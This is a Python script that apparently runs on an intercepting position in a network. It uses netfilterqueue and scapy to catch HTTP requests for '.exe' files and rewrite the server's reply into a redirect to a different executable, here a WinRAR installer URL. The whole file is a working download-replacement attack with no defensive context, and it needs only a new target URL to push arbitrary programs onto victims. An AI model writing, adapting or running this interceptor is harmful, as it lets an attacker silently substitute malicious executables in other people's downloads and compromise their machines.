from time import process_time_ns
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())  # Interpreta el paquete como capa IP
        print(scapy_packet.summary())  # Imprime un resumen del paquete

        if scapy_packet.haslayer(scapy.Raw):  # Verifica si tiene una capa "Raw"
            # Fix 1: Raw load is in bytes, so we need to look for b'.exe' instead of '.exe'
            if scapy_packet[scapy.TCP].dport == 80:  # Request packet
                if b".exe" in scapy_packet[scapy.Raw].load:
                    print("[+] exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())

            elif scapy_packet[scapy.TCP].sport == 80:  # Response packet
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    # Fix 2: Convert the payload to bytes with .encode('utf-8') before setting it
                    modified_packet = set_load(scapy_packet,
                                               b"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701.exe\n\n")
                    packet.set_payload(bytes(modified_packet))  # Ensure payload is in bytes

    except Exception as e:
        print(f"Error: {e}")

    packet.accept()  # Asegúrate de aceptar el paquete después de procesarlo


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("Starting queue...")
    queue.run()
except KeyboardInterrupt:
    print("Stopping queue.")
